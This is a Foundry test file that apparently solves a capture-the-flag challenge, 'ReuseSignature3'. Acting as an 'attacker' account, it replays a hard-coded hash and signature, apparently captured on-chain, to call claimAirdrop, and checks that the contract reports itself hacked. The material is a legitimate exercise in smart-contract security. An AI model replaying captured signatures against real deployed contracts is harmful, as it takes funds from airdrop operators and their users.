// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";
import {ReuseSignature3} from "@main/3_ReuseSignature3.sol";

contract ReuseSignature3Test is Test {

    string mnemonic = "test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
    uint256 attackerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 2); //  address = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC

    address deployer = vm.addr(deployerPrivateKey);
    address attacker = vm.addr(attackerPrivateKey);


    ReuseSignature3 reuseSignature;

    function setUp() public {
        vm.startPrank(deployer);

        vm.label(deployer, "Deployer");
        vm.label(attacker, "Attacker");
       
        reuseSignature = new ReuseSignature3();
        vm.stopPrank();
    }

    function testFork_isSolved() public {
        vm.startPrank(attacker);

        assertFalse(reuseSignature.hacked());

        // npx hardhat run --network polygon scripts_hardhat/3_getPublickeyV6.js
        uint256 amount = 1 ether;
        bytes32 hashed = hex"a0eea3cd5ae052d3ffe50ec82baa3e4f0deb99c6537d1de6ae43d51cd1fbb0f8";
        bytes memory signature = hex"9ef4899e556330b0c4e764d90b7a4c864ef03ba9725aa694ac67783bcf004aa00c01b87088c349649c938589f7b9f633f28ada510ee3e57d2d559fb8fc9da10e1c";

        reuseSignature.claimAirdrop(amount, hashed, signature);

        assertTrue(reuseSignature.hacked());

        vm.stopPrank();
    }

}